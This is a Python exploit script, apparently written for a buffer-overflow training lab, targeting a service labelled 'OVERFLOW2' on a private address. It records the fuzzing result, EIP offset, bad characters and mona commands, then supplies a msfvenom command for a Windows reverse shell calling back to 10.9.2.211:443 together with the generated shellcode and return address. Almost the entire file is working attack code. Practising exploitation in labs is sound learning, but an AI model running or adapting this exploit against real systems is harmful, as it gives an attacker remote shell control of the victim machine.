import buff


target = ("10.10.207.253", 1337)
runner = buff.Buff(target = target, prefix = "OVERFLOW2 ")


"""
FIRST CREATE WOKRING DIRECTORY!!!
!mona config -set workingfolder c:\mona\%p
"""



# ----- 1. FUZZING -----
# Crashed at 700
# runner.fuzz()



# ----- 2. Send Unique Characters -----
# Set Buffer Size
BUFFER_SIZE = 1100
runner.setBufferSize(BUFFER_SIZE)

# runner.sendPattern()



# ----- 3. Find EIP Offset -----
# offset = buff.generator.findPatternOffset(BUFFER_SIZE, "v1Av")
# print(offset)

# Set Eip offset
EIP_OFFSET = 634
runner.setEipOffset(EIP_OFFSET)




# ----- 4. Find Bad Characters -----
"""
Possible: 23 24 3c 3d 83 84 ba

!mona bytearray -b "\x00\x23\x3c\x83\xba"
!mona compare -f C:\mona\oscp\bytearray.bin -a 01A0FA30
"""
# runner.sendBadChars(exclude = [
#     "\x23",
#     "\x3c",
#     "\x83",
#     "\xba"
# ])



# ----- 5. Send Exploit -----
"""
Find JMP ESP
!mona jmp -r esp -cpb "\x00\x23\x3c\x83\xba"

Generate payload
msfvenom -p windows/shell_reverse_tcp LHOST=10.9.2.211 LPORT=443 EXITFUNC=thread -b "\x00\x23\x3c\x83\xba" -f c 
"""

# Set return address (in reverse)
eip_address = "\xaf\x11\x50\x62"
runner.setEipAddress(eip_address)

exploit = (
    "\xfc\xbb\x38\x10\x94\xdb\xeb\x0c\x5e\x56\x31\x1e\xad\x01\xc3"
    "\x85\xc0\x75\xf7\xc3\xe8\xef\xff\xff\xff\xc4\xf8\x16\xdb\x34"
    "\xf9\x76\x55\xd1\xc8\xb6\x01\x92\x7b\x07\x41\xf6\x77\xec\x07"
    "\xe2\x0c\x80\x8f\x05\xa4\x2f\xf6\x28\x35\x03\xca\x2b\xb5\x5e"
    "\x1f\x8b\x84\x90\x52\xca\xc1\xcd\x9f\x9e\x9a\x9a\x32\x0e\xae"
    "\xd7\x8e\xa5\xfc\xf6\x96\x5a\xb4\xf9\xb7\xcd\xce\xa3\x17\xec"
    "\x03\xd8\x11\xf6\x40\xe5\xe8\x8d\xb3\x91\xea\x47\x8a\x5a\x40"
    "\xa6\x22\xa9\x98\xef\x85\x52\xef\x19\xf6\xef\xe8\xde\x84\x2b"
    "\x7c\xc4\x2f\xbf\x26\x20\xd1\x6c\xb0\xa3\xdd\xd9\xb6\xeb\xc1"
    "\xdc\x1b\x80\xfe\x55\x9a\x46\x77\x2d\xb9\x42\xd3\xf5\xa0\xd3"
    "\xb9\x58\xdc\x03\x62\x04\x78\x48\x8f\x51\xf1\x13\xd8\x96\x38"
    "\xab\x18\xb1\x4b\xd8\x2a\x1e\xe0\x76\x07\xd7\x2e\x81\x68\xc2"
    "\x97\x1d\x97\xed\xe7\x34\x5c\xb9\xb7\x2e\x75\xc2\x53\xae\x7a"
    "\x17\xf3\xfe\xd4\xc8\xb4\xae\x94\xb8\x5c\xa4\x1a\xe6\x7d\xc7"
    "\xf0\x8f\x14\x32\x93\xa5\xe1\x3e\xb0\xd2\xf3\x3e\x37\x98\x7d"
    "\xd8\x5d\xce\x2b\x73\xca\x77\x76\x0f\x6b\x77\xac\x6a\xab\xf3"
    "\x43\x8b\x62\xf4\x2e\x9f\x13\xf4\x64\xfd\xb2\x0b\x53\x69\x58"
    "\x99\x38\x69\x17\x82\x96\x3e\x70\x74\xef\xaa\x6c\x2f\x59\xc8"
    "\x6c\xa9\xa2\x48\xab\x0a\x2c\x51\x3e\x36\x0a\x41\x86\xb7\x16"
    "\x35\x56\xee\xc0\xe3\x10\x58\xa3\x5d\xcb\x37\x6d\x09\x8a\x7b"
    "\xae\x4f\x93\x51\x58\xaf\x22\x0c\x1d\xd0\x8b\xd8\xa9\xa9\xf1"
    "\x78\x55\x60\xb2\x99\xb4\xa0\xcf\x31\x61\x21\x72\x5c\x92\x9c"
    "\xb1\x59\x11\x14\x4a\x9e\x09\x5d\x4f\xda\x8d\x8e\x3d\x73\x78"
    "\xb0\x92\x74\xa9\xb0\x14\x8b\x52"
)
runner.setExploit(exploit)

# set padding
runner.setPaddingSize(16)

# runner.sendExploit()
